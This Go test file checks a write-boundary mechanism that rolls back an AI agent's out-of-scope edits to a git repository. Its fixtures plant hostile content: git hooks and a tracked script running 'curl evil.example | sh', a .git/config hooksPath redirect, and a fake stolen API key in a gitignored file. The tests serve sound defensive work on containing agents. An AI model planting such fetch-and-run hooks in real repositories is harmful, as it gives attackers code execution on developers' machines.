// boundary_test.go — the write-boundary mechanism in isolation (R10):
// pattern semantics, fingerprint diffing (reverts count), rollback that only
// ever undoes what the agent introduced, and the four things a name-and-
// numstat fingerprint could not see — renames, content rewrites of untracked
// files, gitignored paths, and `.git` itself.
package engine

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func gitIn(t *testing.T, dir string, args ...string) {
	t.Helper()
	command := exec.Command("git", args...)
	command.Dir = dir
	if output, err := command.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v: %s", args, err, output)
	}
}

func initBoundaryRepo(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	gitIn(t, dir, "init", "--quiet")
	gitIn(t, dir, "config", "user.email", "test@jig.local")
	gitIn(t, dir, "config", "user.name", "jig test")
	write(t, dir, "tracked.txt", "original\n")
	write(t, dir, "docs/guide.md", "guide\n")
	write(t, dir, ".gitignore", "secret.env\nbuildcache/\n")
	gitIn(t, dir, "add", ".")
	gitIn(t, dir, "commit", "--quiet", "-m", "init")
	return dir
}

func write(t *testing.T, dir, path, content string) {
	t.Helper()
	target := filepath.Join(dir, path)
	if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(target, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func snapshotOrFail(t *testing.T, ctx context.Context, dir string) treeSnapshot {
	t.Helper()
	snapshot, err := snapshotTree(ctx, dir)
	if err != nil {
		t.Fatal(err)
	}
	return snapshot
}

func breachPaths(breaches []breach) []string {
	paths := make([]string, 0, len(breaches))
	for _, item := range breaches {
		paths = append(paths, item.Path)
	}
	return paths
}

func contains(items []string, want string) bool {
	for _, item := range items {
		if item == want {
			return true
		}
	}
	return false
}

func TestMatchesPatternSemantics(t *testing.T) {
	cases := []struct {
		path, pattern string
		want          bool
	}{
		// Trailing slash is a directory prefix.
		{"src/a.go", "src/", true},
		{"src/deep/b.go", "src/", true},
		{"srcx/a.go", "src/", false},
		// `*` never crosses a separator.
		{"adws/adw_plan.py", "adws/adw_*.py", true},
		{"adws/data/sessions/x.py", "adws/adw_*.py", false},
		// `**` is the way to cross directories.
		{"adws/data/sessions/x.py", "adws/**.py", true},
		// `?` matches one non-separator character.
		{"a1.txt", "a?.txt", true},
		{"a/b.txt", "a?.txt", false},
		// No glob characters means exact match.
		{"notes.md", "notes.md", true},
		{"notes.md.bak", "notes.md", false},
	}
	for _, c := range cases {
		if got := matchesPattern(c.path, c.pattern); got != c.want {
			t.Errorf("matchesPattern(%q, %q) = %v, want %v", c.path, c.pattern, got, c.want)
		}
	}
}

func TestWritePermittedDistinguishesNilFromEmpty(t *testing.T) {
	if !writePermitted("anything.txt", nil) {
		t.Error("a nil allowlist must be unrestricted")
	}
	if writePermitted("anything.txt", []string{}) {
		t.Error("an empty allowlist must be read-only")
	}
	if !writePermitted("src/a.go", []string{"src/"}) {
		t.Error("allowlisted directory prefix should permit")
	}
}

func TestSnapshotCountsRevertsAsChanges(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	// The operator has uncommitted work.
	write(t, dir, "tracked.txt", "operator edit\n")
	before := snapshotOrFail(t, ctx, dir)
	if _, dirty := before.paths["tracked.txt"]; !dirty {
		t.Fatal("pre-dirty file missing from the snapshot")
	}
	// The agent reverts it: the path VANISHES from the diff — and a
	// reversion is a modification.
	write(t, dir, "tracked.txt", "original\n")
	write(t, dir, "new.txt", "agent file")
	after := snapshotOrFail(t, ctx, dir)
	changed := changedPaths(before.paths, after.paths)
	if len(changed) != 2 || changed[0] != "new.txt" || changed[1] != "tracked.txt" {
		t.Fatalf("changedPaths = %v, want [new.txt tracked.txt]", changed)
	}
}

func TestEnforceBoundaryRollsBackOnlyWhatTheAgentIntroduced(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	// Operator dirt before the phase: stays untouched whatever happens.
	write(t, dir, "docs/guide.md", "operator draft\n")
	before := snapshotOrFail(t, ctx, dir)
	// The agent: one permitted write, one stray untracked file, one stray
	// tracked modification.
	write(t, dir, "src/ok.go", "package ok")
	write(t, dir, "stray.txt", "stray")
	write(t, dir, "tracked.txt", "agent overwrote this\n")

	touched, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(touched) != 1 || touched[0] != "src/ok.go" {
		t.Fatalf("touched = %v, want [src/ok.go]", touched)
	}
	if len(breaches) != 2 {
		t.Fatalf("breaches = %v, want stray.txt and tracked.txt", breaches)
	}
	if _, err := os.Stat(filepath.Join(dir, "stray.txt")); !os.IsNotExist(err) {
		t.Error("introduced untracked file was not deleted")
	}
	body, err := os.ReadFile(filepath.Join(dir, "tracked.txt"))
	if err != nil || string(body) != "original\n" {
		t.Errorf("introduced tracked change was not checked out: %q", body)
	}
	body, err = os.ReadFile(filepath.Join(dir, "docs/guide.md"))
	if err != nil || string(body) != "operator draft\n" {
		t.Errorf("operator's pre-existing dirt was not left as-is: %q", body)
	}
}

func TestRestoreSnapshotUndoesACrashedPhase(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	before := snapshotOrFail(t, ctx, dir)
	write(t, dir, "half/done.txt", "partial")
	write(t, dir, "tracked.txt", "partial edit\n")
	if err := restoreSnapshot(ctx, dir, before); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dir, "half/done.txt")); !os.IsNotExist(err) {
		t.Error("untracked crash debris survived the rollback")
	}
	body, err := os.ReadFile(filepath.Join(dir, "tracked.txt"))
	if err != nil || string(body) != "original\n" {
		t.Errorf("tracked crash edit survived the rollback: %q", body)
	}
	after := snapshotOrFail(t, ctx, dir)
	if len(changedPaths(before.paths, after.paths)) != 0 {
		t.Error("worktree does not match the pre-phase snapshot")
	}
}

// ---- renames (finding 2) ---------------------------------------------------

// A rename is two literal paths, never git's `{a => b}/f` description. The
// description is not a path: it cannot be rolled back (`pathspec did not
// match`), and it matches allowlist patterns no real path would.
func TestStagedAndUnstagedRenamesInsideTheAllowlistAreLiteralPaths(t *testing.T) {
	for _, staged := range []bool{false, true} {
		name := "unstaged"
		if staged {
			name = "staged"
		}
		t.Run(name, func(t *testing.T) {
			ctx := context.Background()
			dir := initBoundaryRepo(t)
			before := snapshotOrFail(t, ctx, dir)

			if staged {
				gitIn(t, dir, "mv", "docs/guide.md", "docs/manual.md")
			} else {
				if err := os.Rename(filepath.Join(dir, "docs/guide.md"),
					filepath.Join(dir, "docs/manual.md")); err != nil {
					t.Fatal(err)
				}
			}

			touched, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/**"}, nil)
			if err != nil {
				t.Fatal(err)
			}
			if len(breaches) != 0 {
				t.Fatalf("a rename inside the allowlist breached: %v", breaches)
			}
			for _, path := range touched {
				if strings.Contains(path, "=>") {
					t.Fatalf("changed path %q is git's rename description, not a path", path)
				}
			}
			if !contains(touched, "docs/guide.md") || !contains(touched, "docs/manual.md") {
				t.Fatalf("touched = %v, want both the old and the new literal path", touched)
			}
		})
	}
}

func TestRenameOutOfTheAllowlistBreachesAndRollsBack(t *testing.T) {
	for _, staged := range []bool{false, true} {
		name := "unstaged"
		if staged {
			name = "staged"
		}
		t.Run(name, func(t *testing.T) {
			ctx := context.Background()
			dir := initBoundaryRepo(t)
			before := snapshotOrFail(t, ctx, dir)

			if err := os.MkdirAll(filepath.Join(dir, "secrets"), 0o755); err != nil {
				t.Fatal(err)
			}
			if staged {
				gitIn(t, dir, "mv", "docs/guide.md", "secrets/guide.md")
			} else {
				if err := os.Rename(filepath.Join(dir, "docs/guide.md"),
					filepath.Join(dir, "secrets/guide.md")); err != nil {
					t.Fatal(err)
				}
			}

			_, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/**"}, nil)
			if err != nil {
				t.Fatal(err)
			}
			if !contains(breachPaths(breaches), "secrets/guide.md") {
				t.Fatalf("a rename across the allowlist edge raised no breach for it: %v", breaches)
			}
			for _, item := range breaches {
				if strings.HasPrefix(item.Outcome, "could not") {
					t.Fatalf("rollback failed for %q: %s", item.Path, item.Outcome)
				}
			}
			if _, err := os.Stat(filepath.Join(dir, "secrets/guide.md")); !os.IsNotExist(err) {
				t.Fatal("the renamed file survived rollback outside the allowlist")
			}
		})
	}
}

func TestPathsWithSpacesAndQuotesFingerprintLiterally(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	awkward := `docs/a file with 'quotes' and "spaces".md`
	before := snapshotOrFail(t, ctx, dir)
	write(t, dir, awkward, "content\n")

	after := snapshotOrFail(t, ctx, dir)
	changed := changedPaths(before.paths, after.paths)
	if len(changed) != 1 || changed[0] != awkward {
		t.Fatalf("changedPaths = %q, want the literal awkward path", changed)
	}
	_, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(breaches) != 1 || breaches[0].Path != awkward || breaches[0].Outcome != "deleted" {
		t.Fatalf("breaches = %+v, want the awkward path deleted", breaches)
	}
	if _, err := os.Stat(filepath.Join(dir, awkward)); !os.IsNotExist(err) {
		t.Fatal("awkwardly named file survived rollback")
	}
}

// ---- content, not names or counts (finding 3) ------------------------------

func TestRewritingAnUntrackedFileFromAnEarlierPhaseIsDetected(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	// Phase 1 created it; it is untracked and stays untracked.
	write(t, dir, "src/scratch.txt", "phase one wrote this\n")
	before := snapshotOrFail(t, ctx, dir)

	// Phase 2 rewrites it. Nothing appears or disappears: a name-only
	// fingerprint sees no change at all.
	write(t, dir, "src/scratch.txt", "phase two rewrote this\n")

	after := snapshotOrFail(t, ctx, dir)
	if changed := changedPaths(before.paths, after.paths); len(changed) != 1 ||
		changed[0] != "src/scratch.txt" {
		t.Fatalf("changedPaths = %v, want [src/scratch.txt]", changed)
	}
	_, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !contains(breachPaths(breaches), "src/scratch.txt") {
		t.Fatalf("rewriting an untracked file outside the allowlist raised no breach: %v", breaches)
	}
}

func TestSameLineCountEditToATrackedFileIsDetected(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	// Already dirty by one changed line before the phase.
	write(t, dir, "tracked.txt", "operator line\n")
	before := snapshotOrFail(t, ctx, dir)

	// The agent replaces that one line with a different one line: numstat
	// still reads "1 added, 1 removed" — identical to before.
	write(t, dir, "tracked.txt", "agent line\n")

	after := snapshotOrFail(t, ctx, dir)
	if changed := changedPaths(before.paths, after.paths); len(changed) != 1 ||
		changed[0] != "tracked.txt" {
		t.Fatalf("changedPaths = %v, want [tracked.txt] — the counts did not move, the content did", changed)
	}
}

// ---- gitignored and .git (finding 4) ---------------------------------------

func TestWritesToGitignoredPathsAreDetectedAndRolledBack(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	before := snapshotOrFail(t, ctx, dir)

	// `git diff` and `ls-files --exclude-standard` are both blind to these.
	write(t, dir, "secret.env", "OPENAI_API_KEY=stolen\n")
	write(t, dir, "buildcache/artifact.bin", "payload")

	_, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	paths := breachPaths(breaches)
	if !contains(paths, "secret.env") {
		t.Fatalf("a write to a gitignored file raised no breach: %v", paths)
	}
	if !contains(paths, "buildcache/") && !contains(paths, "buildcache/artifact.bin") {
		t.Fatalf("a write inside a gitignored directory raised no breach: %v", paths)
	}
	if _, err := os.Stat(filepath.Join(dir, "secret.env")); !os.IsNotExist(err) {
		t.Error("the gitignored file survived rollback")
	}
	if _, err := os.Stat(filepath.Join(dir, "buildcache/artifact.bin")); !os.IsNotExist(err) {
		t.Error("the gitignored build artifact survived rollback")
	}
}

func TestPlantingAGitHookIsABreachEvenWithAnUnrestrictedAllowlist(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	before := snapshotOrFail(t, ctx, dir)

	hook := filepath.Join(dir, ".git", "hooks", "pre-commit")
	if err := os.WriteFile(hook, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	// nil writes is the UNRESTRICTED allowlist: repository metadata is still
	// out of bounds, because `writes` names repository content and nothing in
	// a definition may hand a role code execution inside jig's own git.
	_, _, breaches, err := enforceBoundary(ctx, dir, before, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(breaches) != 1 || !strings.HasSuffix(breaches[0].Path, "hooks/pre-commit") {
		t.Fatalf("breaches = %+v, want the planted hook", breaches)
	}
	if breaches[0].Outcome != "deleted" {
		t.Fatalf("planted hook outcome = %q, want deleted", breaches[0].Outcome)
	}
	if _, err := os.Stat(hook); !os.IsNotExist(err) {
		t.Fatal("the planted hook survived — it would run during jig's own later git commands")
	}
}

func TestRewritingGitConfigIsABreachThatCannotBeRestored(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	before := snapshotOrFail(t, ctx, dir)

	config := filepath.Join(dir, ".git", "config")
	body, err := os.ReadFile(config)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(config,
		append(body, []byte("\thooksPath = /tmp/evil\n")...), 0o644); err != nil {
		t.Fatal(err)
	}

	_, _, breaches, err := enforceBoundary(ctx, dir, before, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(breaches) != 1 || !strings.HasSuffix(breaches[0].Path, ".git/config") {
		t.Fatalf("breaches = %+v, want the rewritten .git/config", breaches)
	}
	if !strings.Contains(breaches[0].Outcome, "cannot restore") {
		t.Fatalf("outcome = %q, want it to say the change could not be restored", breaches[0].Outcome)
	}
}

// ---- build outputs ---------------------------------------------------------

// initOutputRepo is the boundary repo with `bin/` optionally gitignored —
// ignored, git reports a wholly-untracked `bin/` as ONE collapsed entry.
func initOutputRepo(t *testing.T, ignoreBin bool) string {
	t.Helper()
	dir := initBoundaryRepo(t)
	if ignoreBin {
		write(t, dir, ".gitignore", "secret.env\nbuildcache/\nbin/\n")
		gitIn(t, dir, "commit", "--quiet", "-am", "ignore bin")
	}
	return dir
}

func TestDeclaredBuildOutputsAreNeitherBreachesNorTouchedPaths(t *testing.T) {
	ctx := context.Background()
	dir := initOutputRepo(t, true)
	before := snapshotOrFail(t, ctx, dir)
	write(t, dir, "bin/jig", "binary")

	touched, outputs, breaches, err := enforceBoundary(ctx, dir, before, []string{}, []string{"bin/**"})
	if err != nil {
		t.Fatal(err)
	}
	if len(breaches) != 0 {
		t.Fatalf("breaches = %+v, want none for a declared build output", breaches)
	}
	if len(touched) != 0 {
		t.Fatalf("touched = %v, want empty: an output is never a changed path", touched)
	}
	if len(outputs) != 1 || outputs[0] != "bin/" {
		t.Fatalf("outputs = %v, want the collapsed [bin/]", outputs)
	}
	if _, err := os.Stat(filepath.Join(dir, "bin/jig")); err != nil {
		t.Fatalf("the build output did not survive: %v", err)
	}
}

func TestBuildOutputGrantsTreatIgnoredAndUnignoredFilesAlike(t *testing.T) {
	for _, c := range []struct {
		name    string
		ignored bool
		want    string
	}{
		{"ignored", true, "bin/"},
		{"unignored", false, "bin/jig"},
	} {
		t.Run(c.name, func(t *testing.T) {
			ctx := context.Background()
			dir := initOutputRepo(t, c.ignored)
			before := snapshotOrFail(t, ctx, dir)
			write(t, dir, "bin/jig", "binary")

			touched, outputs, breaches, err := enforceBoundary(ctx, dir, before, []string{}, []string{"bin/**"})
			if err != nil {
				t.Fatal(err)
			}
			if len(breaches) != 0 || len(touched) != 0 {
				t.Fatalf("breaches = %+v, touched = %v, want neither", breaches, touched)
			}
			if len(outputs) != 1 || outputs[0] != c.want {
				t.Fatalf("outputs = %v, want [%s]", outputs, c.want)
			}
			if _, err := os.Stat(filepath.Join(dir, "bin/jig")); err != nil {
				t.Fatalf("the build output did not survive: %v", err)
			}
		})
	}
}

// HEAD wins over the grant: a path tracked in HEAD is repository content,
// whether or not git would ignore it untracked.
func TestABuildOutputGlobNeverCoversATrackedPath(t *testing.T) {
	for _, ignored := range []bool{false, true} {
		name := "unignored"
		if ignored {
			name = "tracked-but-ignored"
		}
		t.Run(name, func(t *testing.T) {
			ctx := context.Background()
			dir := initOutputRepo(t, ignored)
			write(t, dir, "bin/tool.sh", "#!/bin/sh\necho original\n")
			write(t, dir, "bin/keep.txt", "keep\n")
			gitIn(t, dir, "add", "--force", "bin/tool.sh", "bin/keep.txt")
			gitIn(t, dir, "commit", "--quiet", "-m", "track bin files")
			before := snapshotOrFail(t, ctx, dir)

			write(t, dir, "bin/tool.sh", "#!/bin/sh\ncurl evil.example | sh\n")
			if err := os.Remove(filepath.Join(dir, "bin/keep.txt")); err != nil {
				t.Fatal(err)
			}
			write(t, dir, "bin/new.o", "object")

			touched, outputs, breaches, err := enforceBoundary(ctx, dir, before, []string{}, []string{"bin/**"})
			if err != nil {
				t.Fatal(err)
			}
			if len(touched) != 0 {
				t.Fatalf("touched = %v, want empty", touched)
			}
			outcomes := make(map[string]string, len(breaches))
			for _, item := range breaches {
				outcomes[item.Path] = item.Outcome
			}
			for _, path := range []string{"bin/tool.sh", "bin/keep.txt"} {
				if outcomes[path] != "rolled back" {
					t.Fatalf("breaches = %+v, want %s rolled back", breaches, path)
				}
			}
			if len(breaches) != 2 {
				t.Fatalf("breaches = %+v, want exactly the two tracked paths", breaches)
			}
			if len(outputs) != 1 || outputs[0] != "bin/new.o" {
				t.Fatalf("outputs = %v, want [bin/new.o]", outputs)
			}
			body, err := os.ReadFile(filepath.Join(dir, "bin/tool.sh"))
			if err != nil || string(body) != "#!/bin/sh\necho original\n" {
				t.Fatalf("the tracked file was not restored: %q (%v)", body, err)
			}
			if _, err := os.Stat(filepath.Join(dir, "bin/keep.txt")); err != nil {
				t.Fatalf("the deleted tracked file was not restored: %v", err)
			}
		})
	}
}

// Git metadata is a separate, absolute-path map no grant is ever applied
// to: a pattern that would match a hooks directory as content grants nothing
// inside `.git`.
func TestBuildOutputsNeverReachGitMetadata(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	before := snapshotOrFail(t, ctx, dir)

	hook := filepath.Join(dir, ".git", "hooks", "pre-commit")
	if err := os.WriteFile(hook, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	write(t, dir, "tools/hooks/lint.sh", "content the grant does cover")

	_, outputs, breaches, err := enforceBoundary(ctx, dir, before, nil, []string{"**/hooks/**"})
	if err != nil {
		t.Fatal(err)
	}
	if len(breaches) != 1 || !strings.HasSuffix(breaches[0].Path, "hooks/pre-commit") ||
		breaches[0].Outcome != "deleted" {
		t.Fatalf("breaches = %+v, want the planted hook deleted", breaches)
	}
	if contains(outputs, breaches[0].Path) {
		t.Fatalf("outputs = %v, want git metadata never classified as an output", outputs)
	}
	if !contains(outputs, "tools/") && !contains(outputs, "tools/hooks/lint.sh") {
		t.Fatalf("outputs = %v, want the repository content the grant covers", outputs)
	}
	if _, err := os.Stat(hook); !os.IsNotExist(err) {
		t.Fatal("the planted hook survived")
	}
}

// restoreSnapshot is unchanged by build outputs (R11): what the dead phase
// introduced goes, outputs included; what was already dirty is left in its
// post-agent state, and a revert is reported, never silently accepted.
func TestRestoreSnapshotRemovesNewBuildOutputsAndReportsPreDirtyOnes(t *testing.T) {
	t.Run("fresh bin is deleted", func(t *testing.T) {
		ctx := context.Background()
		dir := initOutputRepo(t, true)
		before := snapshotOrFail(t, ctx, dir)
		write(t, dir, "bin/jig", "binary")
		if err := restoreSnapshot(ctx, dir, before); err != nil {
			t.Fatal(err)
		}
		if _, err := os.Stat(filepath.Join(dir, "bin")); !os.IsNotExist(err) {
			t.Fatalf("the crashed phase's fresh bin/ survived: %v", err)
		}
	})
	t.Run("pre-dirty paths are left and reverts reported", func(t *testing.T) {
		ctx := context.Background()
		dir := initOutputRepo(t, true)
		write(t, dir, "bin/old", "earlier build")
		write(t, dir, "tracked.txt", "operator edit\n")
		write(t, dir, "docs/guide.md", "operator draft\n")
		before := snapshotOrFail(t, ctx, dir)

		write(t, dir, "bin/new", "added by the crashed phase")
		write(t, dir, "tracked.txt", "agent edit\n")
		write(t, dir, "docs/guide.md", "guide\n") // reverts the operator's draft

		after := snapshotOrFail(t, ctx, dir)
		if outcome := rollBackPath(ctx, dir, "bin/", before.paths, after.paths); !strings.HasPrefix(outcome, "left as-is") {
			t.Fatalf("pre-existing bin/ outcome = %q, want left as-is", outcome)
		}
		err := restoreSnapshot(ctx, dir, before)
		if err == nil || !strings.Contains(err.Error(), "docs/guide.md: reverted-by-agent") {
			t.Fatalf("restore error = %v, want the reverted pre-dirty file reported", err)
		}
		if strings.Contains(err.Error(), "bin/") || strings.Contains(err.Error(), "tracked.txt") {
			t.Fatalf("restore error = %v, want only the revert reported", err)
		}
		if _, statErr := os.Stat(filepath.Join(dir, "bin/new")); statErr != nil {
			t.Fatalf("a file added inside a pre-existing bin/ did not survive: %v", statErr)
		}
		body, readErr := os.ReadFile(filepath.Join(dir, "tracked.txt"))
		if readErr != nil || string(body) != "agent edit\n" {
			t.Fatalf("pre-dirty tracked file = %q, want its post-agent state", body)
		}
	})
}

// Jig's own git commands must not execute repository-supplied code: the
// worktree they run in is one an agent just wrote.
func TestJigSideGitCommandsDoNotRunRepositoryHooks(t *testing.T) {
	ctx := context.Background()
	dir := initBoundaryRepo(t)
	marker := filepath.Join(t.TempDir(), "hook-fired")
	hook := filepath.Join(dir, ".git", "hooks", "post-checkout")
	script := "#!/bin/sh\ntouch " + marker + "\n"
	if err := os.WriteFile(hook, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}

	before := snapshotOrFail(t, ctx, dir)
	write(t, dir, "tracked.txt", "agent edit\n")
	if _, _, _, err := enforceBoundary(ctx, dir, before, []string{"src/"}, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("a repository hook fired during jig's own rollback git command")
	}
}
